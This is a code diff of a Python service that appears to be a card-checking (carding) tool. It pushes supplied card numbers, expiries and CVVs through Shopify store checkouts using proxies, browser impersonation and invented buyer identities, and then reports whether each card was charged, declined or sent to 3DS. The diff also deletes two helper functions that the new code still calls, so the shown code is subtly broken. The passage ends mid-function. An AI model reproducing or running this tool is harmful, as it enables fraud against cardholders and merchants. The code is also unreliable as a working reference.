@@ -24,7 +24,7 @@ app = Flask(__name__)
 # ⚙️ ENV & CONFIG
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
-BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "25")) 
+BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
 
 _PRODUCTS_LIST = []
 _PRODUCT_POOL = []
@@ -45,17 +45,17 @@ def _load_products():
                     except ValueError:
                         price_val = 0.0
                     
-                    # Only use products >= $3.00 to bypass minimum limits
-                    if price_val < 3.00:
+                    # Filter out items < $1.00
+                    if price_val < 1.00:
                         continue
 
                     _PRODUCTS_LIST.append({
                         "vid": m.group(1), 
-                        "price": m.group(2), 
+                        "price": str(m.group(2)), 
                         "shop": m.group(3).strip().rstrip('/')
                     })
         if _PRODUCTS_LIST:
-            print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} valid products (>= $3.00)", flush=True)
+            print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} valid products", flush=True)
     except Exception as e:
         print(f"[NODE] Error loading products.txt: {e}", flush=True)
 
@@ -89,9 +89,6 @@ def _dec_busy():
     with _workers_lock: _workers_busy = max(0, _workers_busy - 1)
 
 _last_failure = {}
-_PRODUCT_CACHE = {}   
-_BLACKLIST = {}       
-_CACHE_LOCK = threading.Lock()
 
 def _fail(reason, **extra):
     global _last_failure
@@ -120,10 +117,6 @@ ADDRESSES = [
     {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
     {"street":"500 5th Ave",              "city":"New York",  "state":"NY","zip":"10110","phone":"+12125550100"},
     {"street":"200 W Madison St",         "city":"Chicago",   "state":"IL","zip":"60606","phone":"+13125550100"},
-    {"street":"600 Congress Ave",         "city":"Austin",    "state":"TX","zip":"78701","phone":"+15125550100"},
-    {"street":"1 Market St",              "city":"San Francisco","state":"CA","zip":"94105","phone":"+14155550100"},
-    {"street":"300 S Biscayne Blvd",      "city":"Miami",     "state":"FL","zip":"33131","phone":"+13055550100"},
-    {"street":"100 Peachtree St",         "city":"Atlanta",   "state":"GA","zip":"30303","phone":"+14045550100"},
 ]
 
 def _identity():
@@ -223,23 +216,6 @@ def _tax_amount(b):
                .get("result",{}).get("sellerProposal",{}))
         return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
     except Exception: return "0.0"
-
-def _tax_from_rejected(b):
-    try:
-        d = json.loads(b)
-        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
-        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
-    except Exception: return "0.0"
-
-def _total_from_rejected(b):
-    try:
-        d = json.loads(b)
-        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
-        for k in ("checkoutTotal","total","runningTotal"):
-            v = sp.get(k,{}).get("value",{}).get("amount")
-            if v: return v
-    except Exception: pass
-    return ""
 
 def _is_shipping_required(b):
     try:
@@ -521,7 +497,7 @@ def _classify_failed(code):
     return (c or "CARD_DECLINED"), False, False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🧠 PIPELINE
+# 🧠 PIPELINE (Strict Flow)
 # ─────────────────────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
     t_start = time.monotonic()
@@ -533,377 +509,368 @@ def _run_check(card_str, proxy_str):
     ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
     yyyy = "20" + yy if len(yy) == 2 else yy
 
-    for attempt in range(3):
-        if remain() < 15:
-            break
+    prod = _get_next_product()
+    if not prod:
+        return _fail("NO_PRODUCTS", reason="No products in products.txt")
 
-        prod = _get_next_product()
-        if not prod:
-            return _fail("NO_PRODUCTS", reason="No products >= $3.00 in list")
+    shop_url = prod["shop"]
+    vid = prod["vid"]
+    price = prod["price"]
+    if not price: price = "1.00"
 
-        shop_url = prod["shop"]
-        vid = prod["vid"]
-        price = prod["price"]
+    proxy_url = _parse_proxy(proxy_str)
+    ua        = random.choice(USER_AGENTS)
+    imp       = random.choice(BROWSER_PROFILES)
 
-        proxy_url = _parse_proxy(proxy_str)
-        ua        = random.choice(USER_AGENTS)
-        imp       = random.choice(BROWSER_PROFILES)
+    session = requests.Session(impersonate=imp)
+    if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
-        session = requests.Session(impersonate=imp)
-        if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
+    try:
+        try:
+            r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
+                            allow_redirects=True, timeout=t_max(4))
+        except Exception as e:
+            return _resp(f"CART_FAILED_{str(e)[:10]}", price=f"{price} USD")
+        
+        if r.status_code != 200:
+            return _resp("CART_FAILED", price=f"{price} USD")
+
+        checkout_url  = r.url
+        checkout_html = r.text
+        cart_token    = (re.search(r'/checkouts/(?:cn/)?([^/?]+)', checkout_url) or [None, ""])[1]
+
+        session_token = _session_token(checkout_html)
+        commit_sha    = _commit_sha(checkout_html)
+        stable_id     = _stable_id(checkout_html)
+        if not session_token: return _fail("NO_SESSION_TOKEN",  shop=shop_url)
+        if not commit_sha:    return _fail("NO_COMMIT_SHA",     shop=shop_url)
+        if not stable_id:     return _fail("NO_STABLE_ID",      shop=shop_url)
+
+        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(4))
+        prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
+        submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
+        poll_id   = poll_id   or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+
+        currency = "USD"
+        m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
+        if m: currency = m.group(1)
+
+        amount = price
+        m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
+        if m: amount = m.group(1)
+
+        fn, ln, email, addr_raw = _identity()
+        addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
+                "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
+
+        hdr = {
+            "accept":                       "application/json",
+            "content-type":                 "application/json",
+            "origin":                       shop_url,
+            "referer":                      checkout_url,
+            "shopify-checkout-client":      "checkout-web/1.0",
+            "shopify-checkout-source":      f'id="{cart_token}", type="cn"',
+            "user-agent":                   ua,
+            "x-checkout-one-session-token": session_token,
+            "x-checkout-web-build-id":      commit_sha,
+        }
+        prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
+        
+        use_lines = False
 
         try:
-            try:
-                r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
-                                allow_redirects=True, timeout=t_max(4))
-            except Exception:
-                continue 
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
+            r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
             
-            if r.status_code != 200:
-                continue 
+            if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
+                if "merchandiseLines" in r1.text and "not defined" in r1.text:
+                    use_lines = True
+                    p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
+                    r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
+                    
+        except Exception as e:
+            return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
+        if r1.status_code != 200:
+            return _fail("P1_HTTP", shop=shop_url, status=r1.status_code, body=r1.text[:800])
+        queue_token = _queue_token(r1.text) or None
+        if not queue_token:
+            return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
 
-            checkout_url  = r.url
-            checkout_html = r.text
-            cart_token    = (re.search(r'/checkouts/(?:cn/)?([^/?]+)', checkout_url) or [None, ""])[1]
+        try:
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
+            p["variables"]["queueToken"] = queue_token
+            r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
+        except Exception as e:
+            return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])
+        if r2.status_code != 200:
+            return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-            session_token = _session_token(checkout_html)
-            commit_sha    = _commit_sha(checkout_html)
-            stable_id     = _stable_id(checkout_html)
-            if not session_token or not commit_sha or not stable_id:
-                continue 
+        pm_id = ""
+        del_h = ""
+        signed = []
+        tax = "0.0"
+        amount_f = amount
+        shipping_required = True
+        r3_text = ""
 
-            prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(4))
-            prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
-            submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
-            poll_id   = poll_id   or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
-
-            currency = "USD"
-            m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
-            if m: currency = m.group(1)
-
-            amount = price
-            m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
-            if m: amount = m.group(1)
-
+        for addr_attempt in range(2):
+            try:
+                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
+                p["variables"]["queueToken"] = queue_token
+                r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
+                
+                if r3.status_code == 200:
+                    r3_text = r3.text
+                    if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
+                        raise Exception("Shipping undeliverable")
+                    
+                    pm_id  = _payment_method_id(r3_text)
+                    del_h  = _delivery_handle(r3_text)
+                    signed = _signed_handles(r3_text)
+                    tax    = _tax_amount(r3_text)
+                    amount_f = _checkout_total(r3_text) or amount
+                    queue_token = _queue_token(r3_text) or queue_token
+                    shipping_required = _is_shipping_required(r3_text)
+                    
+                    if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
+                        break
+            except Exception:
+                pass
+                
+            time.sleep(0.1)
             fn, ln, email, addr_raw = _identity()
             addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
                     "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
 
-            hdr = {
-                "accept":                       "application/json",
-                "content-type":                 "application/json",
-                "origin":                       shop_url,
-                "referer":                      checkout_url,
-                "shopify-checkout-client":      "checkout-web/1.0",
-                "shopify-checkout-source":      f'id="{cart_token}", type="cn"',
-                "user-agent":                   ua,
-                "x-checkout-one-session-token": session_token,
-                "x-checkout-web-build-id":      commit_sha,
-            }
-            prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
-            
-            use_lines = False
+        if not pm_id:
+            pm_id = _payment_method_id_from_html(checkout_html)
 
-            try:
-                p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
-                r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-                
-                if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
-                    if "merchandiseLines" in r1.text and "not defined" in r1.text:
-                        use_lines = True
-                        p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
-                        r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-                        
-            except Exception:
-                continue
-            
-            if r1.status_code != 200:
-                continue
-            queue_token = _queue_token(r1.text) or None
-            if not queue_token:
-                continue
+        if not pm_id or (shipping_required and not del_h):
+            return _resp("SHIPPING_FAILED", price=f"{amount_f} {currency}")
 
-            try:
-                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
-                p["variables"]["queueToken"] = queue_token
-                r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-            except Exception:
-                continue
-            if r2.status_code != 200:
-                continue
+        ident_sig = _ident_sig(checkout_html)
+        v_url     = _vault_url(checkout_html)
+        v_dom     = _vault_domain(checkout_html)
 
-            pm_id = ""
-            del_h = ""
-            signed = []
-            tax = "0.0"
-            amount_f = amount
-            shipping_required = True
-            r3_text = ""
+        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
+                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(4))
+        
+        if not sid: 
+            return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
 
-            for addr_attempt in range(2):
-                if remain() < 6:
-                    break
-                try:
-                    p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
-                    p["variables"]["queueToken"] = queue_token
-                    r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-                    
-                    if r3.status_code == 200:
-                        r3_text = r3.text
-                        if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
-                            raise Exception("Shipping undeliverable")
-                        
-                        pm_id  = _payment_method_id(r3_text)
-                        del_h  = _delivery_handle(r3_text)
-                        signed = _signed_handles(r3_text)
-                        tax    = _tax_amount(r3_text)
-                        amount_f = _checkout_total(r3_text) or amount
-                        queue_token = _queue_token(r3_text) or queue_token
-                        shipping_required = _is_shipping_required(r3_text)
-                        
-                        if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
-                            break
-                except Exception:
-                    pass
-                    
-                time.sleep(0.1)
-                fn, ln, email, addr_raw = _identity()
-                addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
-                        "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
+        sa        = _street_addr(fn, ln, addr_raw)
+        price_str = f"{amount_f} {currency}"
+        merch_key = "lines" if use_lines else "merchandiseLines"
 
-            if not pm_id:
-                pm_id = _payment_method_id_from_html(checkout_html)
-
-            if not pm_id or (shipping_required and not del_h):
-                continue 
-
-            if remain() < 5:
-                break 
-
-            ident_sig = _ident_sig(checkout_html)
-            v_url     = _vault_url(checkout_html)
-            v_dom     = _vault_domain(checkout_html)
-
-            sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
-                            ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(4))
-            
-            if not sid: 
-                return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
-                
-            if remain() < 3: 
-                break
-
-            sa        = _street_addr(fn, ln, addr_raw)
-            price_str = f"{amount_f} {currency}"
-            merch_key = "lines" if use_lines else "merchandiseLines"
-
-            def _build_submit(cur_tax, cur_total):
-                if not shipping_required:
-                    delivery_block = {
-                        "deliveryLines": [{
-                            "selectedDeliveryStrategy": {
-                                "deliveryStrategyMatchingConditions": {
-                                    "estimatedTimeInTransit": {"any": True},
-                                    "shipments": {"any": True}
-                                },
-                                "options": {}
+        def _build_submit(cur_tax, cur_total):
+            if not shipping_required:
+                delivery_block = {
+                    "deliveryLines": [{
+                        "selectedDeliveryStrategy": {
+                            "deliveryStrategyMatchingConditions": {
+                                "estimatedTimeInTransit": {"any": True},
+                                "shipments": {"any": True}
                             },
-                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                            "deliveryMethodTypes": ["NONE"],
-                            "expectedTotalPrice": {"any": True},
-                            "destinationChanged": True
-                        }],
-                        "noDeliveryRequired": [],
-                        "useProgressiveRates": False,
-                        "prefetchShippingRatesStrategy": None,
-                        "supportsSplitShipping": True
-                    }
-                    delivery_exp = {"deliveryExpectationLines": []}
-                else:
-                    delivery_block = {
-                        "deliveryLines": [{
-                            "destination": {"streetAddress": sa},
-                            "selectedDeliveryStrategy": {
-                                "deliveryStrategyByHandle": {"handle": del_h, "customDeliveryRate": False},
-                                "options": {},
-                            },
-                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                            "deliveryMethodTypes": ["SHIPPING"],
-                            "expectedTotalPrice": {"any": True},
-                            "destinationChanged": False,
-                        }],
-                        "noDeliveryRequired": [],
-                        "useProgressiveRates": False,
-                        "prefetchShippingRatesStrategy": None,
-                        "supportsSplitShipping": True,
-                    }
-                    delivery_exp = {"deliveryExpectationLines": [{"signedHandle": h} for h in signed]}
-
-                return {
-                    "variables": {
-                        "input": {
-                            "sessionInput": {"sessionToken": session_token},
-                            "queueToken":   queue_token,
-                            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
-                            "delivery": delivery_block,
-                            "deliveryExpectations": delivery_exp,
-                            "merchandise": {merch_key: [{
-                                "stableId": stable_id,
-                                "merchandise": {"productVariantReference": {
-                                    "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
-                                    "variantId": f"gid://shopify/ProductVariant/{vid}",
-                                    "properties":        [],
-                                    "sellingPlanId":     None,
-                                    "sellingPlanDigest": None,
-                                }},
-                                "quantity":             {"items": {"value": 1}},
-                                "expectedTotalPrice":   {"any": True},
-                                "lineComponentsSource": None,
-                                "lineComponents":       [],
-                            }]},
-                            "memberships": {"memberships": []},
-                            "payment": {
-                                "totalAmount": {"value": {"amount": cur_total, "currencyCode": currency}},
-                                "paymentLines": [{
-                                    "paymentMethod": {
-                                        "directPaymentMethod": {
-                                            "sessionId":               sid,
-                                            "paymentMethodIdentifier": pm_id,
-                                            "billingAddress":          {"streetAddress": sa},
-                                            "cardSource":              None,
-                                        },
-                                        "giftCardPaymentMethod":                 None,
-                                        "redeemablePaymentMethod":               None,
-                                        "walletPaymentMethod":                   None,
-                                        "walletsPlatformPaymentMethod":          None,
-                                        "localPaymentMethod":                    None,
-                                        "paymentOnDeliveryMethod":               None,
-                                        "paymentOnDeliveryMethod2":              None,
-                                        "manualPaymentMethod":                   None,
-                                        "customPaymentMethod":                   None,
-                                        "offsitePaymentMethod":                  None,
-                                        "customOnsitePaymentMethod":             None,
-                                        "deferredPaymentMethod":                 None,
-                                        "customerCreditCardPaymentMethod":       None,
-                                        "paypalBillingAgreementPaymentMethod":   None,
-                                        "remotePaymentInstrument":               None,
-                                    },
-                                    "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
-                                }],
-                                "billingAddress": {"streetAddress": sa},
-                            },
-                            "buyerIdentity": {
-                                "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
-                                "email":            email,
-                                "emailChanged":     False,
-                                "phoneCountryCode": "US",
-                                "marketingConsent": [],
-                                "shopPayOptInPhone": {"countryCode": "US"},
-                                "rememberMe":       False,
-                            },
-                            "tip": {"tipLines": []},
-                            "poNumber": None,
-                            "taxes": {
-                                "proposedAllocations":           None,
-                                "proposedTotalAmount":           {"value": {"amount": cur_tax, "currencyCode": currency}},
-                                "proposedTotalIncludedAmount":   None,
-                                "proposedMixedStateTotalAmount": None,
-                                "proposedExemptions":            [],
-                            },
-                            "note": {"message": None, "customAttributes": []},
-                            "localizationExtension": {"fields": []},
-                            "nonNegotiableTerms": None,
-                            "scriptFingerprint": {
-                                "signature": None, "signatureUuid": None,
-                                "lineItemScriptChanges": [], "paymentScriptChanges": [],
-                                "shippingScriptChanges": [],
-                            },
-                            "optionalDuties": {"buyerRefusesDuties": False},
-                            "cartMetafields": [],
+                            "options": {}
                         },
-                        "attemptToken": f"{cart_token}-{_rand_suffix()}",
-                        "metafields":   [],
-                        "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())},
-                    },
-                    "operationName": "SubmitForCompletion",
-                    "id": submit_id,
+                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
+                        "deliveryMethodTypes": ["NONE"],
+                        "expectedTotalPrice": {"any": True},
+                        "destinationChanged": True
+                    }],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": False,
+                    "prefetchShippingRatesStrategy": None,
+                    "supportsSplitShipping": True
                 }
+                delivery_exp = {"deliveryExpectationLines": []}
+            else:
+                delivery_block = {
+                    "deliveryLines": [{
+                        "destination": {"streetAddress": sa},
+                        "selectedDeliveryStrategy": {
+                            "deliveryStrategyByHandle": {"handle": del_h, "customDeliveryRate": False},
+                            "options": {},
+                        },
+                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
+                        "deliveryMethodTypes": ["SHIPPING"],
+                        "expectedTotalPrice": {"any": True},
+                        "destinationChanged": False,
+                    }],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": False,
+                    "prefetchShippingRatesStrategy": None,
+                    "supportsSplitShipping": True,
+                }
+                delivery_exp = {"deliveryExpectationLines": [{"signedHandle": h} for h in signed]}
 
-            body    = ""
-            cur_tax = tax or "0.0"
-            cur_tot = amount_f
-            
-            for tax_attempt in range(2):
-                try:
-                    r_submit = session.post(
-                        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
-                        json=_build_submit(cur_tax, cur_tot), headers=hdr,
-                        timeout=t_max(5),
-                    )
-                    body = r_submit.text
-                except Exception:
-                    break
+            return {
+                "variables": {
+                    "input": {
+                        "sessionInput": {"sessionToken": session_token},
+                        "queueToken":   queue_token,
+                        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
+                        "delivery": delivery_block,
+                        "deliveryExpectations": delivery_exp,
+                        "merchandise": {merch_key: [{
+                            "stableId": stable_id,
+                            "merchandise": {"productVariantReference": {
+                                "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
+                                "variantId": f"gid://shopify/ProductVariant/{vid}",
+                                "properties":        [],
+                                "sellingPlanId":     None,
+                                "sellingPlanDigest": None,
+                            }},
+                            "quantity":             {"items": {"value": 1}},
+                            "expectedTotalPrice":   {"value": {"amount": cur_total, "currencyCode": currency}}, # EXACT
+                            "lineComponentsSource": None,
+                            "lineComponents":       [],
+                        }]},
+                        "memberships": {"memberships": []},
+                        "payment": {
+                            "totalAmount": {"any": True},
+                            "paymentLines": [{
+                                "paymentMethod": {
+                                    "directPaymentMethod": {
+                                        "sessionId":               sid,
+                                        "paymentMethodIdentifier": pm_id,
+                                        "billingAddress":          {"streetAddress": sa},
+                                        "cardSource":              None,
+                                    },
+                                    "giftCardPaymentMethod":                 None,
+                                    "ownedGiftCardPaymentMethod":            None,
+                                    "redeemablePaymentMethod":               None,
+                                    "walletPaymentMethod":                   None,
+                                    "walletsPlatformPaymentMethod":          None,
+                                    "localPaymentMethod":                    None,
+                                    "paymentOnDeliveryMethod":               None,
+                                    "paymentOnDeliveryMethod2":              None,
+                                    "manualPaymentMethod":                   None,
+                                    "customPaymentMethod":                   None,
+                                    "offsitePaymentMethod":                  None,
+                                    "customOnsitePaymentMethod":             None,
+                                    "deferredPaymentMethod":                 None,
+                                    "customerCreditCardPaymentMethod":       None,
+                                    "paypalBillingAgreementPaymentMethod":   None,
+                                    "remotePaymentInstrument":               None,
+                                },
+                                "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
+                            }],
+                            "billingAddress": {"streetAddress": sa},
+                            "creditCardBin": ccn[:6],
+                            "allowStoreCredit": False,
+                        },
+                        "buyerIdentity": {
+                            "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
+                            "email":            email,
+                            "emailChanged":     False,
+                            "phoneCountryCode": "US",
+                            "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
+                            "shopPayOptInPhone": {"number": "", "countryCode": "US"},
+                            "rememberMe":       False,
+                        },
+                        "tip": {"tipLines": []},
+                        "poNumber": None,
+                        "taxes": {
+                            "proposedAllocations":           None,
+                            "proposedTotalAmount":           {"value": {"amount": cur_tax, "currencyCode": currency}},
+                            "proposedTotalIncludedAmount":   None,
+                            "proposedMixedStateTotalAmount": None,
+                            "proposedExemptions":            [],
+                        },
+                        "note": {"message": None, "customAttributes": []},
+                        "localizationExtension": {"fields": []},
+                        "nonNegotiableTerms": None,
+                        "scriptFingerprint": {
+                            "signature": None, "signatureUuid": None,
+                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
+                            "shippingScriptChanges": [],
+                        },
+                        "optionalDuties": {"buyerRefusesDuties": False},
+                        "cartMetafields": [],
+                    },
+                    "attemptToken": f"{cart_token}-{_rand_suffix()}",
+                    "metafields":   [],
+                    "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())},
+                },
+                "operationName": "SubmitForCompletion",
+                "id": submit_id,
+            }
 
-                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body or "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
-                    nt = _tax_from_rejected(body)
-                    nT = _total_from_rejected(body)
-                    if nt: cur_tax = nt
-                    if nT: cur_tot = nT
-                    price_str = f"{cur_tot} {currency}"
-                    continue
-                break
+        body    = ""
+        cur_tax = tax or "0.0"
+        cur_tot = amount_f
+        
+        for tax_attempt in range(2):
+            try:
+                r_submit = session.post(
+                    f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
+                    json=_build_submit(cur_tax, cur_tot), headers=hdr,
+                    timeout=t_max(5),
+                )
+                body = r_submit.text
+            except Exception as e:
+                return _fail("SUBMIT_EXC", shop=shop_url, err=str(e)[:100])
 
-            elapsed_ms = (time.monotonic() - t_start) * 1000
+            if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body or "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
+                nt = _tax_from_rejected(body)
+                nT = _total_from_rejected(body)
+                if nt: cur_tax = nt
+                if nT: cur_tot = nT
+                price_str = f"{cur_tot} {currency}"
+                continue
+            break
 
-            if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
-                return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
-            if '"ActionRequiredReceipt"' in body:
-                return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
-            if '"FailedReceipt"' in body:
-                resp, apv, chg = _classify_failed(_code(body))
-                return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
+        elapsed_ms = (time.monotonic() - t_start) * 1000
 
-            if '"ProcessingReceipt"' in body:
-                rid = _receipt_id(body)
-                rss = _receipt_session(body)
-                if rid and rss and remain() > 4:
-                    # ═══ FIX: Increased polling to 10 attempts (5 seconds) ═══
-                    for _ in range(10):
-                        if remain() < 2: break
-                        time.sleep(0.5)
-                        try:
-                            params = {"operationName":"PollForReceipt",
-                                      "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
-                                      "id": poll_id}
-                            r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
-                                              headers=hdr, timeout=t_max(3))
-                            pb = r_p.text
-                            if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
-                                ms = (time.monotonic() - t_start) * 1000
-                                return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-                            if '"ActionRequiredReceipt"' in pb:
-                                ms = (time.monotonic() - t_start) * 1000
-                                return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
-                            if '"FailedReceipt"' in pb:
-                                resp, apv, chg = _classify_failed(_code(pb))
-                                ms = (time.monotonic() - t_start) * 1000
-                                return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
-                        except Exception:
-                            continue
-                return _resp("PROCESSING_TIMEOUT", price=price_str, elapsed_ms=elapsed_ms)
+        if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
+            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
+        if '"ActionRequiredReceipt"' in body:
+            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
+        if '"FailedReceipt"' in body:
+            resp, apv, chg = _classify_failed(_code(body))
+            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
 
-            code = _code(body)
-            if code:
-                resp, apv, chg = _classify_failed(code)
-                return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
+        if '"ProcessingReceipt"' in body:
+            rid = _receipt_id(body)
+            rss = _receipt_session(body)
+            if rid and rss and remain() > 4:
+                for _ in range(10):
+                    if remain() < 2: break
+                    time.sleep(0.5)
+                    try:
+                        params = {"operationName":"PollForReceipt",
+                                  "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
+                                  "id": poll_id}
+                        r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
+                                          headers=hdr, timeout=t_max(3))
+                        pb = r_p.text
+                        if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
+                            ms = (time.monotonic() - t_start) * 1000
+                            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
+                        if '"ActionRequiredReceipt"' in pb:
+                            ms = (time.monotonic() - t_start) * 1000
+                            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
+                        if '"FailedReceipt"' in pb:
+                            resp, apv, chg = _classify_failed(_code(pb))
+                            ms = (time.monotonic() - t_start) * 1000
+                            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
+                    except Exception:
+                        continue
+            return _resp("PROCESSING_TIMEOUT", price=price_str, elapsed_ms=elapsed_ms)
 
-        except Exception:
-            continue
-        finally:
-            try: session.close()
-            except Exception: pass
+        code = _code(body)
+        if code:
+            resp, apv, chg = _classify_failed(code)
